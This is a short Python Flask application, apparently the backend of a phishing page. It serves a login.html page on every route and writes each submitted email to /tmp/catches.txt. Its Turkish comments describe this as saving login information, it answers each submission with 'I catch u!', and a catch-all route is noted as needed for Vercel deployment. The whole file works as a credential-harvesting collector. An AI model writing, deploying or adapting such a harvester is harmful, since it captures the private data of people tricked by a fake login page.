from flask import Flask, render_template, request, jsonify
import os
from flask.helpers import send_from_directory

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('login.html')

@app.route('/login', methods=['POST'])
def login():
    email = request.json.get('email')
    
    # Giriş bilgilerini catches.txt dosyasına kaydet
    with open('/tmp/catches.txt', 'a', encoding='utf-8') as f:
        f.write(f"Email: {email}\n")
        f.write("-" * 50 + "\n")
    
    return jsonify({"message": "I catch u!"})

# Statik dosyalar için
@app.route('/static/<path:path>')
def serve_static(path):
    return send_from_directory('static', path)

# Vercel için gerekli
@app.route('/<path:path>')
def catch_all(path):
    return render_template('login.html')

if __name__ == '__main__':
    app.run(debug=True)
